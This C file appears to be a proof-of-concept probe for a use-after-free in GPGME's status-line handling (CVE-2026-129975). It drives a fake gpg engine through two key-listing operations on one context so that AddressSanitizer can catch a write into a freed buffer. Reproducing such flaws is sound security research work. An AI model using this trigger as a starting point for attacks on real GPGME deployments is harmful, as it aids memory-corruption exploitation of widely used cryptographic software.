/* Probe the stale status buffer after the CVE-2026-129975 early return.
 *
 * Public APIs only. Operation 1 sends a long status line whose monitor
 * callback returns an error, leaving gpg->status.buffer pointing at the
 * block freed by realloc. Operation 2 reuses the same context; if GPGME
 * re-enters read_status with that stale pointer, ASan observes the write
 * into the freed block. If the context cannot be reused, that is a
 * negative result, not a rung-5 claim.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;

static gpgme_error_t
failing_status_cb (void *opaque, const char *keyword, const char *args)
{
  (void)opaque;
  cb_calls++;
  fprintf (stderr, "status_cb call=%d op_marker=%s keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, getenv ("FAKE_GPG_MARKER"), keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  if (strlen (args) > 500)
    return gpg_error (GPG_ERR_GENERAL);
  return 0;
}

static void
do_keylist (gpgme_ctx_t ctx, int op)
{
  gpgme_key_t key;
  gpgme_error_t err;

  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "op%d keylist_start err=%s\n", op, gpgme_strerror (err));
  while (!err)
    {
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  fprintf (stderr, "op%d keylist_end err=%s cb_calls=%d\n",
           op, gpgme_strerror (err), cb_calls);
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_error_t err;
  const char *version;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }
  version = gpgme_check_version (NULL);
  if (!version)
    return 2;
  fprintf (stderr, "gpgme version=%s\n", version);
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, failing_status_cb, NULL);

  /* Operation 1: long line, callback error, stale buffer.  */
  setenv ("FAKE_GPG_LEN", "1200", 1);
  setenv ("FAKE_GPG_MARKER", "H", 1);
  do_keylist (ctx, 1);

  /* Operation 2: short line on the same context.  */
  setenv ("FAKE_GPG_LEN", "20", 1);
  setenv ("FAKE_GPG_MARKER", "Z", 1);
  do_keylist (ctx, 2);

  gpgme_release (ctx);
  puts ("release done");
  return 0;
}
